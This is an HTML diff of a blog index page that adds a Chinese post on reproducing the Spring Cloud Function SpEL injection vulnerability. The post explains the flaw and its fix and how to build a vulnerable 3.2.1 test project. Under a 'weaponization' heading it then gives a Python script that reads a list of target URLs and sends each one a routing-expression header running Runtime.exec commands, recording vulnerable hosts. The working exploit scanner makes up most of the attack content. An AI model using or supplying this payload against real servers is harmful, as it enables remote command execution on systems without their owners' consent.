@@ -117,7 +117,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-count">10</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -125,6 +125,10 @@
             <a href="/categories/">
         <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">tags</span>
       </div>
   </nav>
 </div>
@@ -152,6 +156,89 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://hkirito.github.io/2022/03/31/Spring-SPEL%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Sanwu">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sanwu">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/03/31/Spring-SPEL%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">Spring_SPEL漏洞学习复现</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-03-31 14:21:42 / Modified: 19:35:11" itemprop="dateCreated datePublished" datetime="2022-03-31T14:21:42+08:00">2022-03-31</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="Spring-Cloud-Function-SPEL漏洞"><a href="#Spring-Cloud-Function-SPEL漏洞" class="headerlink" title="Spring Cloud Function SPEL漏洞"></a>Spring Cloud Function SPEL漏洞</h1><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><h4 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h4><p>暂无</p>
+<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在Springboot中支持使用在header中直接指明调用对应函数的方式，但是在Spring的Routing-function中获取Header头时使用了功能强大但安全性不高的StandardEcalutionContext导致在处理时直接传入了SPEL进行了命令执行。</span><br><span class="line">在修复的版本中，已新增了headerEvalContext对象，该对象所对应的是使用了仅支持最基本功能的SimpleEvaluationContext。来避免了漏洞的发生</span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>使用idea的Spring项目构建一个基本项目</p>
+<p><img src="/2022/03/31/Spring-SPEL%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%A4%8D%E7%8E%B0/image_8qoniQsNvMyGiQHmxLAMj1.png" alt="流程1"></p>
+<p><img src="/2022/03/31/Spring-SPEL%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%A4%8D%E7%8E%B0/image_wnwtJxxbatRS76WcEnxrSY.png" alt="流程2"></p>
+<p><img src="/2022/03/31/Spring-SPEL%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%A4%8D%E7%8E%B0/image_8BVBexdvBv4ZweknC43f1f.png" alt="流程3"></p>
+<p>等待项目初始化完毕后，编辑pom.xml文件</p>
+<p><img src="/2022/03/31/Spring-SPEL%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%A4%8D%E7%8E%B0/image_2EVoq229RwRA1kHhMuuXHW.png" alt="pom.xml"></p>
+<p>将版本改为可受影响的版本，目前3.2.2版本已修复所以我这里尝试的3.2.1</p>
+<p>然后直接运行项目即可，默认启动端口为8080</p>
+<p>利用idea的http项目直接创建一个.http结尾的文件</p>
+<p>然后在其中直接请求</p>
+<p><img src="/2022/03/31/Spring-SPEL%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%A4%8D%E7%8E%B0/image_6ob9EaLQ6bL5tqxh9Hencu.png" alt="复现"></p>
+<p>点击执行即可触发漏洞</p>
+<p><img src="/2022/03/31/Spring-SPEL%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%A4%8D%E7%8E%B0/image_96qXjx17TaVFGtnpxqhXif.png" alt="效果"></p>
+<h3 id="武器化"><a href="#武器化" class="headerlink" title="武器化"></a>武器化</h3><p>批量检测Poc脚本-(简单通过返回码及返回内容判断影响)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">txt, cmd</span>):</span></span><br><span class="line">    path = <span class="string">&#x27;/functionRouter&#x27;</span></span><br><span class="line">    payload = <span class="string">f&#x27;T(java.lang.Runtime).getRuntime().exec(&quot;<span class="subst">&#123;cmd&#125;</span>&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line">    data = <span class="string">&#x27;data&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;spring.cloud.function.routing-expression&#x27;</span>: payload,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    f = <span class="built_in">open</span>(txt)</span><br><span class="line">    urllist = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urllist:</span><br><span class="line">        url = url.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">all</span> = url + path</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            req = requests.post(url=<span class="built_in">all</span>, headers=headers, data=data, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">            code = req.status_code</span><br><span class="line">            text = req.text</span><br><span class="line">            rsp = <span class="string">&#x27;&quot;error&quot;:&quot;Internal Server Error&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> code == <span class="number">500</span> <span class="keyword">and</span> rsp <span class="keyword">in</span> text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[+]<span class="subst">&#123;url&#125;</span> 存在漏洞&#x27;</span>)</span><br><span class="line">                poc_file = <span class="built_in">open</span>(<span class="string">&#x27;succ.txt&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>)</span><br><span class="line">                poc_file.write(url + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                poc_file.close()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[-]<span class="subst">&#123;url&#125;</span> 不存在漏洞&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.RequestException:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[-]<span class="subst">&#123;url&#125;</span> 检测超时&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[-]<span class="subst">&#123;url&#125;</span> 检测异常&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cmd1 = sys.argv[<span class="number">1</span>]</span><br><span class="line">        t = threading.Thread(target=test(cmd1, <span class="string">&#x27;whoami&#x27;</span>))</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;用法：&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;python XXX.py target.txt&#x27;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;exit![0]&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
